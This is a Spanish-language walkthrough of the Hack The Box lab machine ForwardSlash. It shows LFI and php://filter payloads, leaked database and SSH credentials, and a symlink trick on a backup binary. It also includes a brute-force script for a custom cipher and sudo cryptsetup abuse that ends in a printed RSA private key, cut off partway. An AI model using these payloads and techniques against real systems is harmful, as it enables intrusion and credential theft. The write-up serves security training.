
<p align="center">
<img src="https://user-images.githubusercontent.com/9076747/82154121-1d149700-986c-11ea-8a38-5cf4aabb7eb2.png">
</p>

ForwardSlash es una máquina Linux de dificultad difícil en la cuál nos aprovecharemos de la vulnerabilidad LFI (Local File Inclusion) en el servidor web y en el escalamiento de privilegios, el desarrollo de un script en Python para descifrar un archivo que contiene la contraseña de un directorio en el cual el usuario puede ejecutar comando como administrador sin ser root.


## Reconocimiento y Enumeración

### Ping

En primer lugar se debe revisar que la máquina esté activa. Hacemos un ping usando el siguiente comando:
`ping -c 1 forwardslash.htb`

- `-c <n>` = realizar *n* veces el ping

### Nmap

Se procede a realizar un escaneo de todos los puertos con la herramienta nmap usando el siguiente comando:
`nmap -p- --open -T5 -v -n forwardslash.htb -oG all-ports`

- `-p-:` escanea todos los 65536 puertos
- `--open:` solo se va a tener en cuenta los puertos abiertos
- `-T5:` establece la plantilla de temporización, el rango es entre 0-5 y por lo tanto, el escaneo va a ir a una mayor velocidad
- `-v:` cuando nmap descubre un puerto, lo imprime por consola
- `-n:` se desactiva la resolución de DNS
- `-oG:` el archivo se va a guardar en formato grepable 

El output de nmap es el siguiente:

```console
root@kali:/home/kali# nmap -p- --open -T5 -v -n forwardslash.htb -oG all-ports
Scanning forwardslash.htb (10.10.10.183) [4 ports]
Completed Ping Scan at 01:09, 0.21s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 01:09
Scanning forwardslash.htb (10.10.10.183) [65535 ports]
Discovered open port 22/tcp on 10.10.10.183
Discovered open port 80/tcp on 10.10.10.183
Completed SYN Stealth Scan at 01:10, 66.16s elapsed (65535 total ports)
Nmap scan report for forwardslash.htb (10.10.10.183)
Host is up (0.20s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Una vez se sabe qué puertos están abiertos en la máquina objetivo se procede a revisar las versiones de los servicios usando el comando:
`nmap -sC -sV -p22,80 forwardslash.htb -oN targeted.txt`

- `-sC:`  realiza un escaneo usando los scripts por defecto que se encuentran en la base de datos de nmap.
- `-sV:` intenta encontrar la versión del servicio que está corriendo en el puerto correspondiente.
- `-p:` se establece los puertos que deseo hacer el escaneo.
- `oN:` el archivo se va a guardar en un formato normal, en este caso en formato de texto.

El output de nmap es el siguiente:

```console
root@kali:/home/kali/Documents/HTB/Machines/ForwardSlash/nmap# nmap -sC -sV -p22,80 forwardslash.htb -oN targeted.txt
Nmap scan report for forwardslash.htb (10.10.10.183)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Backslash Gang
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Los puertos que están abiertos corresponde a los siguientes servicios:

- `Puerto 22 (SSH Secure Shell):` sirve para acceder de manera remota a máquinas de manera segura.
- `Puerto 80 (HTTP):` se utiliza para la navegación web de forma no segura.


### Web Fuzzing

Entramos al sitio web y encontramos que ha sido hackeado por The Backslash Gang. Procedemos a usar la herramienta wfuzz para encontrar recursos no vinculados en el sitio web. El siguiente comando lo usaremos para encontrar subdominios:
`wfuzz -c --hc 404,404 -w /usr/share/wordlists/wfuzz/general/common.txt -H 'Host: FUZZ.forwardslash.htb' -u http://10.10.10.183`

El output del comando es el siguiente y encontramos que `backup` retorna 6 palabras y 33 caracteres.

```console
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.183/
Total requests: 949

===================================================================
ID           Response   Lines    Word     Chars       Payload        
===================================================================

000000084:   302        0 L      0 W      0 Ch        "back"
000000087:   302        0 L      0 W      0 Ch        "backoffice"
000000088:   302        0 L      6 W      33 Ch       "backup"     
000000089:   302        0 L      0 W      0 Ch        "back-up"         
000000090:   302        0 L      0 W      0 Ch        "backups" 
```

Ahora, revisamos qué archivos y directorios hay dentro de `backup.forwardslash.htb` usando también wfuzz. Para mirar qué archivos .php hay utilizamos el siguiente comando

`wfuzz -c --hc=400,404 -t 500 -w /usr/share/wordlists/wfuzz/general/common.txt http://backup.forwardslash.htb/FUZZ.php`

Los archivos que hay en el servidor web son los siguiente:

```console
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://backup.forwardslash.htb/FUZZ.php
Total requests: 949

===================================================================
ID           Response   Lines    Word     Chars       Payload        
===================================================================

000000421:   302        0 L      1 W      1 Ch        "index"        
000000487:   200        39 L     99 W     1267 Ch     "login"        
000000490:   302        0 L      0 W      0 Ch        "logout"       
000000919:   302        0 L      6 W      33 Ch       "welcome"      
000000062:   200        1 L      22 W     127 Ch      "api"          
000000677:   200        41 L     104 W    1490 Ch     "register"     
000000193:   200        0 L      0 W      0 Ch        "config"       
000000311:   302        0 L      0 W      0 Ch        "environment"  
```

Para saber qué directorios hay en el servidor web con wfuzz usamos el siguiente comando:

`wfuzz -c --hc=400,404 -t 500 -w /usr/share/wordlists/wfuzz/general/common.txt http://backup.forwardslash.htb/FUZZ`

Los directorios que hay son los siguientes:

```console
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://backup.forwardslash.htb/FUZZ
Total requests: 949

===================================================================
ID           Response   Lines    Word     Chars       Payload        
===================================================================

000000256:   301        9 L      28 W     332 Ch      "dev"          

```

Cuando ingresamos a `http://backup.forwardslash.htb` encontramos una página de login y un link para registrarnos. Vamos al ink de `sign up now` y llenamos todos los campos que nos solicita.

Una vez registrados, nos logeamos con las el usuario y contraseña previamente creados. Cuando entramos nos aparece un dashboard con 6 links:  *Reset your password*. *Sign out of your account*, *Change your username*, *Change your profile picture*, *Quick message*  y  *Hall of fame*. Posteriormente, entramos al link de `Change your profile picture` donde hay un input field y un botón de submit.

## Explotación

Inspeccionamos el código y encontramos que el campo url y el botón están deshabilitados, así que borramos la palabra `disabled` y debería quedar de la siguiente forma:

```html
<form action="/profilepicture.php" method="post">
        URL:
        <input type="text" name="url" style="width:600px"><br>
        <input style="width:200px" type="submit" value="Submit">
</form>
`````

Esta página es vulnerable a LFI (Local File Inclusion) donde se permite ejecutar archivos localmente en el servidor y lograr acceso a los archivos de configuración. De esta forma vamos a probar un ataque de directorio transversal para saber si tenemos acceso a un archivo sensible. Para esto, en el campo de url escribimos `../../../etc/passwd`, damos click a submit y haciendo uso de Burp Suite nos aparece lo siguiente:

`````console

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
pain:x:1000:1000:pain:/home/pain:/bin/bash
chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
`````

Continuando la enumeración en el servidor web, encontramos que el archivo de configuración de la base de datos se encuentra en la siguiente dirección: `/var/www/backup.forwardslash.htb/config.php`, por lo tanto, llamamos a este archivo desde Burp Suite y nos retorna el contenido del archivo de configuración el cual es el siguiente:

```php
<?php
//credentials for the temp db while we recover, had to backup old config, didn't want it getting compromised -pain
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'www-data');
define('DB_PASSWORD', '5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec');
define('DB_NAME', 'site');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

En la fase de enumeración, encontramos que hay unos archivos dentro el servidor los cuales tenemos acceso `api.php` es uno de ellos, sin embargo, con Burp Suite no nos deja observar el contenido de este archivo. Leyendo cómo hacer bypass de php se hace de la siguiente forma:

```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index
```

En nuestro caso, vamos a hacerlo con el archivo `api.php` de la siguiente forma en Burp Suite al igual que lo hicimos con el archivo `config.php`: 

`php://filter/convert.base64-encode/resource=api.php`

Cuando hacemos el llamado con Burp Suite nos aparece el siguiente código codificado en base 64:

`PD9waHAKCnNlc3Npb25fc3RhcnQoKTsKCmlmIChpc3NldCgkX1BPU1RbJ3VybCddKSkgewoKCWlmKCghaXNzZXQoJF9TRVNTSU9OWyJsb2dnZWRpbiJdKSB8fCAkX1NFU1NJT05bImxvZ2dlZGluIl0gIT09IHRydWUpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CgkJZWNobyAiVXNlciBtdXN0IGJlIGxvZ2dlZCBpbiB0byB1c2UgQVBJIjsKCQlleGl0OwoJfQoKCSRwaWN0dXJlID0gZXhwbG9kZSgiLS0tLS1vdXRwdXQtLS0tLTxicj4iLCBmaWxlX2dldF9jb250ZW50cygkX1BPU1RbJ3VybCddKSk7CglpZiAoc3RycG9zKCRwaWN0dXJlWzBdLCAic2Vzc2lvbl9zdGFydCgpOyIpICE9PSBmYWxzZSkgewoJCWVjaG8gIlBlcm1pc3Npb24gRGVuaWVkOyBub3QgdGhhdCB3YXkgOykiOwoJCWV4aXQ7Cgl9CgllY2hvICRwaWN0dXJlWzBdOwoJZXhpdDsKfQo/Pgo8IS0tIFRPRE86IHJlbW92ZWQgYWxsIHRoZSBjb2RlIHRvIGFjdHVhbGx5IGNoYW5nZSB0aGUgcGljdHVyZSBhZnRlciBiYWNrc2xhc2ggZ2FuZyBhdHRhY2tlZCB1cywgc2ltcGx5IGVjaG9zIGFzIGRlYnVnIG5vdyAtLT4K`

Una vez decodificado este código usando el siguiente comando: `echo <codigo> | base64 -d` el output es el siguiente:

```php
<?php

session_start();

if (isset($_POST['url'])) {

	if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true) && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1"){
		echo "User must be logged in to use API";
		exit;
	}

	$picture = explode("-----output-----<br>", file_get_contents($_POST['url']));
	if (strpos($picture[0], "session_start();") !== false) {
		echo "Permission Denied; not that way ;)";
		exit;
	}
	echo $picture[0];
	exit;
}
?>
```

Ahora vamos a hacer lo mismo con el directorio `dev` de la siguiente forma:

`php://filter/convert.base64-encode/resource=dev/index.php`

Cuando hacemos el llamado con Burp Suite nos aparece el siguiente código codificado en base 64: 

`PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K`

Una vez decodificado este código usando el siguiente comando: `echo <codigo> | base64 -d` el output es el siguiente:

```php
<?php
//include_once ../session.php;
// Initialize the session
session_start();

if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true || $_SESSION['username'] !== "admin") && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1"){
    header('HTTP/1.0 403 Forbidden');
    echo "<h1>403 Access Denied</h1>";
    echo "<h3>Access Denied From ", $_SERVER['REMOTE_ADDR'], "</h3>";
    //echo "<h2>Redirecting to login in 3 seconds</h2>"
    //echo '<meta http-equiv="refresh" content="3;url=../login.php" />';
    //header("location: ../login.php");
    exit;
}
?>
<html>
	<h1>XML Api Test</h1>
	<h3>This is our api test for when our new website gets refurbished</h3>
	<form action="/dev/index.php" method="get" id="xmltest">
		<textarea name="xml" form="xmltest" rows="20" cols="50"><api>
    <request>test</request>
</api>
</textarea>
		<input type="submit">
	</form>

</html>

<!-- TODO:
Fix FTP Login
-->

<?php
if ($_SERVER['REQUEST_METHOD'] === "GET" && isset($_GET['xml'])) {

	$reg = '/ftp:\/\/[\s\S]*\/\"/';
	//$reg = '/((((25[0-5])|(2[0-4]\d)|([01]?\d?\d)))\.){3}((((25[0-5])|(2[0-4]\d)|([01]?\d?\d))))/'

	if (preg_match($reg, $_GET['xml'], $match)) {
		$ip = explode('/', $match[0])[2];
		echo $ip;
		error_log("Connecting");

		$conn_id = ftp_connect($ip) or die("Couldn't connect to $ip\n");

		error_log("Logging in");

		if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {

			error_log("Getting file");
			echo ftp_get_string($conn_id, "debug.txt");
		}

		exit;
	}

	libxml_disable_entity_loader (false);
	$xmlfile = $_GET["xml"];
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$api = simplexml_import_dom($dom);
	$req = $api->request;
	echo "-----output-----<br>\r\n";
	echo "$req";
}

function ftp_get_string($ftp, $filename) {
    $temp = fopen('php://temp', 'r+');
    if (@ftp_fget($ftp, $temp, $filename, FTP_BINARY, 0)) {
        rewind($temp);
        return stream_get_contents($temp);
    }
    else {
        return false;
    }
}

?>
```

El script anterior nos revela la contraseña del usuario `chiv`  la cual es: `N0bodyL1kesBack/`, así que procedemos a conectarnos vía SSH con las credenciales anteriores.

```console
root@kali:/home/kali# ssh chiv@forwardslash.htb
The authenticity of host 'forwardslash.htb (10.10.10.183)' can't be established.
ECDSA key fingerprint is SHA256:7DrtoyB3GmTDLmPm01m7dHeoaPjA7+ixb3GDFhGn0HM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'forwardslash.htb,10.10.10.183' (ECDSA) to the list of known hosts.
chiv@forwardslash.htb's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

chiv@forwardslash:~$ pwd
/home/chiv

```

Enumerando los directorios encontramos el archivo `user.txt` pero no tenemos permisos para ver el contenido:

```console
chiv@forwardslash:~$ pwd
/home/chiv
chiv@forwardslash:~$ cd /home/pain
chiv@forwardslash:/home/pain$ ls
encryptorinator  note.txt  user.txt
chiv@forwardslash:/home/pain$ cat user.txt
cat: user.txt: Permission denied
chiv@forwardslash:/home/pain$
```

En la carpeta `/var/backups` hay un archivo llamado `config.php.bak` sin embargo, tampoco tenemos permiso para ver el contenido.

Para poder visualizar la información del archivo `config.php.bak`, haremos uso de `ln` en Linux que es una utilidad para crear hipervínculo entre archivos , en este caso crearemos un hipervínculo simbólico ya que la mayoría de sistemas operativos evitan la creación de enlaces duros a los directorios. Para esto creamos el siguiente script y lo guardamos como`shell.sh`:

```shell
i=$(backup | grep ERROR | awk '{print $2}');
ln -s /var/backups/config.php.bak /home/chiv/$i;/usr/bin/backup;
```

Ejecutamos el archivo de la siguiente forma: `/bin/bash shell.sh` y el contenido del archivo es:

```php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'pain');
define('DB_PASSWORD', 'db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704');
define('DB_NAME', 'site');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

Ahora, nos cambiamos al usuario `pain` con la contraseña encontrada en el archivo anterior y allí encontraremos la flag:

```console
chiv@forwardslash:~$ su pain
Password: 
pain@forwardslash:/home/chiv$ cd /home/pain
pain@forwardslash:~$ ls
encryptorinator  note.txt  user.txt
pain@forwardslash:~$ cat user.txt 
a7ea2f..........................
```



## Escalamiento de privilegios

Primero revisamos qué privilegios tiene el usuario `pain`

```console
pain@forwardslash:~/encryptorinator$ sudo -l
Matching Defaults entries for pain on forwardslash:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pain may run the following commands on forwardslash:
    (root) NOPASSWD: /sbin/cryptsetup luksOpen *
    (root) NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    (root) NOPASSWD: /bin/umount ./mnt/
```

En el directorio del usuario `pain` hay una carpeta llamada `encryptorinator` que contiene dos archivos:

```console
pain@forwardslash:~/encryptorinator$ ls
ciphertext  encrypter.py
```

El código del archivo `encrypter.py` es el siguiente:

```python
def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)


print encrypt('REDACTED', 'REDACTED')
print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
```

Transferimos estos dos archivos a nuestro máquina:

```console
root@kali:/home/kali/Documents/HTB/Machines/ForwardSlash/content# scp encrypter.py pain@forwardslash.htb:/home/pain/encryptorinator/encrypter.py 
pain@forwardslash.htb's password: 
encrypter.py: No such file or directory
root@kali:/home/kali/Documents/HTB/Machines/ForwardSlash/content# scp pain@forwardslash.htb:/home/pain/encryptorinator/encrypter.py . 
pain@forwardslash.htb's password: 
encrypter.py                                                                                                                        100%  931     5.2KB/s   00:00    
root@kali:/home/kali/Documents/HTB/Machines/ForwardSlash/content# scp pain@forwardslash.htb:/home/pain/encryptorinator/ciphertext . 
pain@forwardslash.htb's password: 
ciphertext                                                                                                                          100%  165     0.9KB/s   00:00    
root@kali:/home/kali/Documents/HTB/Machines/ForwardSlash/content# ls
ciphertext  encrypter.py
```

Para descifrar el mensaje del archivo `ciphertext` usamos el siguiente script facilitado por [CHUCHO](https://www.hackthebox.eu/home/users/profile/52976) el cual, a groso modo, es una adaptación del script para hacer fuerza bruta con el diccionario `rockyou.txt`:

```python
import sys
import re
def encrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in key:
        for i in range(len(msg)):
            if i == 0:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[-1])
            else:
                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])

            while tmp > 255:
                tmp -= 256
            msg[i] = chr(tmp)
    return ''.join(msg)

def decrypt(key, msg):
    key = list(key)
    msg = list(msg)
    for char_key in reversed(key):
        for i in reversed(range(len(msg))):
            if i == 0:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[-1]))
            else:
                tmp = ord(msg[i]) - (ord(char_key) + ord(msg[i-1]))
            while tmp < 0:
                tmp += 256
            msg[i] = chr(tmp)
    return ''.join(msg)


#print encrypt('REDACTED', 'REDACTED')
#print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))

def main():
    if len(sys.argv) != 3:
        print "(+) usage: %s dict file_to_crack " % sys.argv[0]
        print '(+) eg: %s rockyou.txt ciphertext ' %sys.argv[0]
        exit(-1)
    
    print "(+) Loading File dictionary....."
    
    fh = open(sys.argv[1], 'rt')
    f = open (sys.argv[2], 'rt')
    textFile=f.read()    
    f.close()
    line = fh.readline()
    while line:
    	text = decrypt(line,textFile)
    	p = re.compile('^[a-zA-Z]{3,}$')
    	if 'key' in text:
    		print "(+) WORD:  "+ line
    		print "TEXG:"
		print (text)
    	line = fh.readline()
    
    fh.close()
    	
    
if __name__ == "__main__":
    main()

```

Ejecutamos el código y nos aparece la contraseña:

```console
root@kali:/home/kali/Documents/HTB/Machines/ForwardSlash/content# python descrifra.py /usr/share/wordlists/rockyou.txt ciphertext 
(+) Loading File dictionary.....
(+) WORD:  thisismypassword

TEXG:
���~U��y.diW��you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf�
```

Como vimos anteriormente, el usuario `pain` tiene permiso para montar imágenes como administrador sin necesidad de la contraseña del root:

```
pain@forwardslash:~$ sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
Enter passphrase for /var/backups/recovery/encrypted_backup.img: 
```

La contraseña es `cB!6%sdH8Lj^@Y*$C2cf`

Luego nos vamos al directorio `/` y ejecutamos el siguiente comando:

`sudo /bin/mount /dev/mapper/backup ./mnt/`

Nos cambiamos al directorio `mnt` y vemos que hay una llave privada RSA:

```console
pain@forwardslash:/$ cd mnt
pain@forwardslash:/mnt$ ls
id_rsa
pain@forwardslash:/mnt$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK
RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf
yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc
u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu
NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9
MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa
V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg
G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO
3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC
vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p
MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD
Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn
5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs
V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg
e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8
6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh
i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq
tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW
